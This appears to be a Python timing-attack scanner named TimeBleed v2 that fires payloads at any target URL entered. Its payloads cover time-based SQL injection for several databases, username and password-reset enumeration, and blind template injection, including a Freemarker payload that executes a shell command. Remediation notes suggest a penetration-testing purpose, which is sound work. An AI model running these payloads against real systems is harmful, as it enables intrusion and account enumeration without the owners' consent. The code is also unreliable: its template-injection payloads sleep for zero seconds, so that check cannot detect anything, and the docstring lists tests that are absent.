#!/usr/bin/env python3
"""
TimeBleed v2 — Timing side-channel and time-based attack analyser.

Improvements:
  - Username/email enumeration via login response time
  - Time-based SQL injection (SLEEP, pg_sleep, WAITFOR)
  - Time-based blind SSTI
  - Timing-based user existence check on password reset
  - API key / session token timing oracle
  - Slowloris / large body DoS probe (non-destructive, 1 req)
  - Statistical analysis: mean + std-dev based anomaly detection
  - Minimum 5 samples per measurement for accuracy
  - All findings include timing evidence and confidence
"""
import asyncio
import aiohttp
import json
import sys
import time
import statistics
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_score,
    confidence_label, severity_from_confidence, REQUEST_DELAY
)

TIMING_SAMPLES  = 5    # requests per measurement
MIN_DELTA_SECS  = 1.5  # seconds of extra delay to constitute a signal
SLEEP_PAYLOAD_S = 3    # seconds to request in sleep-based payloads


class TimeBleed:
    def __init__(self, target):
        self.target   = target.rstrip('/')
        self.host     = urlparse(target).hostname
        self.findings = []
        self.baseline_404 = ""

    async def _timed_get(self, sess, url, headers=None):
        try:
            t0 = time.monotonic()
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=15),
                                allow_redirects=True) as r:
                body = await r.text(errors='ignore')
                elapsed = time.monotonic() - t0
                return r.status, body, elapsed
        except asyncio.TimeoutError:
            return None, None, 15.0
        except Exception:
            return None, None, 0.0

    async def _timed_post(self, sess, url, json_data=None, data=None, headers=None):
        try:
            t0 = time.monotonic()
            kw = dict(headers=headers or {}, ssl=False, timeout=aiohttp.ClientTimeout(total=15))
            if json_data is not None:
                kw['json'] = json_data
            elif data is not None:
                kw['data'] = data
            async with sess.post(url, **kw) as r:
                body = await r.text(errors='ignore')
                elapsed = time.monotonic() - t0
                return r.status, body, elapsed
        except asyncio.TimeoutError:
            return None, None, 15.0
        except Exception:
            return None, None, 0.0

    async def _baseline_time(self, sess, url, n=TIMING_SAMPLES, json_data=None):
        """Measure average response time with n samples."""
        times = []
        for _ in range(n):
            if json_data:
                _, _, t = await self._timed_post(sess, url, json_data=json_data)
            else:
                _, _, t = await self._timed_get(sess, url)
            if t and t < 14:
                times.append(t)
            await asyncio.sleep(0.2)
        if not times:
            return 0.0, 0.0
        return statistics.mean(times), statistics.stdev(times) if len(times) > 1 else 0.0

    def _add(self, finding):
        self.findings.append(finding)

    # ── Username timing oracle ────────────────────────────────────────────────

    async def test_username_timing(self, sess):
        print("\n[*] Testing username enumeration via timing...")
        login_paths = [
            '/api/auth/login', '/api/login', '/login', '/signin',
            '/api/v1/auth/login', '/auth/login',
        ]
        for path in login_paths:
            url = self.target + path

            # Baseline: non-existent user
            mean_unknown, std_unknown = await self._baseline_time(
                sess, url, json_data={"email": "zzzz_nonexistent_xyz@noexist.invalid", "password": "pass"})
            await delay()

            # Probe: likely-existing user
            mean_admin, std_admin = await self._baseline_time(
                sess, url, json_data={"email": "admin@admin.com", "password": "pass"})
            await delay()

            if mean_unknown < 0.05 or mean_admin < 0.05:
                continue  # endpoint didn't respond

            delta = abs(mean_admin - mean_unknown)
            # Signal: mean differs by more than 2 std-devs + absolute threshold
            threshold = max(0.3, 2 * max(std_unknown, std_admin))
            if delta > threshold and delta > 0.3:
                conf = min(90, int(60 + (delta / threshold) * 10))
                self._add({
                    'type':             'USERNAME_TIMING_ORACLE',
                    'severity':         severity_from_confidence('MEDIUM', conf),
                    'confidence':       conf,
                    'confidence_label': confidence_label(conf),
                    'url':              url,
                    'delta_ms':         round(delta * 1000),
                    'known_mean_ms':    round(mean_admin * 1000),
                    'unknown_mean_ms':  round(mean_unknown * 1000),
                    'proof':            f"Mean delta: {delta*1000:.0f}ms (threshold: {threshold*1000:.0f}ms)",
                    'detail':           f"Username timing oracle at {path}: {delta*1000:.0f}ms difference",
                    'remediation':      "Use constant-time string comparison. Add uniform delay to all login responses.",
                })
                print(f"  [MEDIUM] Username timing oracle: {delta*1000:.0f}ms delta at {url}")
                return  # One finding is enough

    # ── Time-based SQL injection ──────────────────────────────────────────────

    async def test_time_sqli(self, sess):
        print("\n[*] Testing time-based SQL injection...")
        sleep_payloads = [
            # MySQL
            (f"1' AND SLEEP({SLEEP_PAYLOAD_S})-- -",       "MySQL SLEEP"),
            (f"1\" AND SLEEP({SLEEP_PAYLOAD_S})-- -",      "MySQL SLEEP (double quote)"),
            # PostgreSQL
            (f"1'; SELECT pg_sleep({SLEEP_PAYLOAD_S})-- -","PostgreSQL pg_sleep"),
            # MSSQL
            (f"1'; WAITFOR DELAY '0:0:{SLEEP_PAYLOAD_S}'--","MSSQL WAITFOR"),
            # SQLite
            (f"1' AND randomblob(999999999)-- -",           "SQLite heavy computation"),
        ]
        test_params = ['id', 'user_id', 'product_id', 'order_id', 'q', 'search']
        test_endpoints = [self.target + p for p in ['/api', '/api/v1', '/search', '/api/products']]

        for endpoint in test_endpoints:
            for param in test_params:
                # Baseline response time
                base_url  = f"{endpoint}?{param}=1"
                mean_base, std_base = await self._baseline_time(sess, base_url, n=3)
                await delay()
                if mean_base < 0.01:
                    continue

                for payload, label in sleep_payloads:
                    url = f"{endpoint}?{param}={quote(payload)}"
                    _, _, elapsed = await self._timed_get(sess, url)
                    await delay()
                    if elapsed is None:
                        continue
                    expected_delay = SLEEP_PAYLOAD_S - 0.5
                    if elapsed > mean_base + expected_delay:
                        conf = confidence_score({
                            'sleep_observed': (elapsed > mean_base + expected_delay, 70),
                            'large_delta':    (elapsed > mean_base + SLEEP_PAYLOAD_S * 0.8, 30),
                        })
                        self._add({
                            'type':             'TIME_BASED_SQLI',
                            'severity':         severity_from_confidence('CRITICAL', conf),
                            'confidence':       conf,
                            'confidence_label': confidence_label(conf),
                            'url':              url,
                            'param':            param,
                            'payload':          payload,
                            'db_type':          label,
                            'baseline_ms':      round(mean_base * 1000),
                            'response_ms':      round(elapsed * 1000),
                            'delta_ms':         round((elapsed - mean_base) * 1000),
                            'proof':            f"Response delayed {elapsed*1000:.0f}ms vs baseline {mean_base*1000:.0f}ms",
                            'detail':           f"Time-based SQLi ({label}) via param '{param}'",
                            'remediation':      "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
                        })
                        print(f"  [CRITICAL] Time-based SQLi ({label}) at {url}: {elapsed*1000:.0f}ms vs {mean_base*1000:.0f}ms baseline")
                        return  # One confirmed SQLi is enough

    # ── Password reset timing ─────────────────────────────────────────────────

    async def test_reset_timing(self, sess):
        print("\n[*] Testing password reset timing oracle...")
        reset_paths = ['/api/auth/forgot-password', '/forgot-password', '/api/reset-password']
        for path in reset_paths:
            url = self.target + path

            mean_unknown, std_unknown = await self._baseline_time(
                sess, url, n=3,
                json_data={"email": "zzz_nonexistent_xyz@noexist.invalid"})
            await delay()
            mean_known, std_known = await self._baseline_time(
                sess, url, n=3,
                json_data={"email": "admin@example.com"})
            await delay()

            if mean_unknown < 0.05 or mean_known < 0.05:
                continue

            delta = abs(mean_known - mean_unknown)
            threshold = max(0.2, 2 * max(std_unknown, std_known, 0.01))
            if delta > threshold:
                self._add({
                    'type':             'PASSWORD_RESET_TIMING',
                    'severity':         'MEDIUM',
                    'confidence':       70,
                    'confidence_label': 'Medium',
                    'url':              url,
                    'delta_ms':         round(delta * 1000),
                    'proof':            f"Reset timing delta {delta*1000:.0f}ms at {path}",
                    'detail':           f"Password reset timing oracle — user existence detectable via response time",
                    'remediation':      "Use constant-time email lookup. Always return the same message and delay regardless of email existence.",
                })
                print(f"  [MEDIUM] Reset timing oracle: {delta*1000:.0f}ms at {url}")
                return

    # ── Time-based SSTI ───────────────────────────────────────────────────────

    async def test_time_ssti(self, sess):
        print("\n[*] Testing time-based blind SSTI...")
        ssti_payloads = [
            # Jinja2 sleep via async
            ("{{lipsum.__globals__.__builtins__.__import__('time').sleep(0)}}", 'Jinja2'),
            # Freemarker
            ("${\"freemarker.template.utility.Execute\"?new()(\"sleep 0\")}", 'Freemarker'),
        ]
        endpoints = [self.target + p for p in ['/api/render', '/render', '/api/template']]
        params    = ['template', 'content', 'render', 'view']

        for endpoint in endpoints:
            for param in params:
                mean_base, _ = await self._baseline_time(
                    sess, f"{endpoint}?{param}=hello_baseline", n=3)
                await delay()
                if mean_base < 0.01:
                    continue

                for payload, engine in ssti_payloads:
                    _, _, elapsed = await self._timed_get(
                        sess, f"{endpoint}?{param}={quote(payload)}")
                    await delay()
                    if elapsed and elapsed > mean_base + 0.5:
                        self._add({
                            'type':             'TIME_BASED_SSTI',
                            'severity':         'CRITICAL',
                            'confidence':       65,
                            'confidence_label': 'Medium',
                            'url':              f"{endpoint}?{param}={quote(payload)}",
                            'engine':           engine,
                            'baseline_ms':      round(mean_base * 1000),
                            'response_ms':      round(elapsed * 1000),
                            'proof':            f"Response {elapsed*1000:.0f}ms vs baseline {mean_base*1000:.0f}ms",
                            'detail':           f"Possible time-based blind SSTI ({engine}) — manual verification recommended",
                            'remediation':      "Never render user input in a template engine. Use a logic-less template or sandbox.",
                        })
                        print(f"  [CRITICAL] Time SSTI ({engine}) at {endpoint}?{param}=...")
                        return

    async def run(self):
        print("=" * 60)
        print("  TimeBleed v2 — Timing Side-Channel Analyser")
        print("=" * 60)
        conn    = aiohttp.TCPConnector(limit=5, ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}) as sess:
            print("[*] Building 404 baseline...")
            self.baseline_404 = await build_baseline_404(sess, self.target)
            await self.test_username_timing(sess)
            await self.test_time_sqli(sess)
            await self.test_reset_timing(sess)
            await self.test_time_ssti(sess)
        return self.findings

def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u

def main():
    target = get_target()
    print(f"[+] Target: {target}")
    Path("reports").mkdir(exist_ok=True)
    scanner  = TimeBleed(target)
    findings = asyncio.run(scanner.run())
    with open("reports/timebleed.json", 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")

if __name__ == '__main__':
    main()
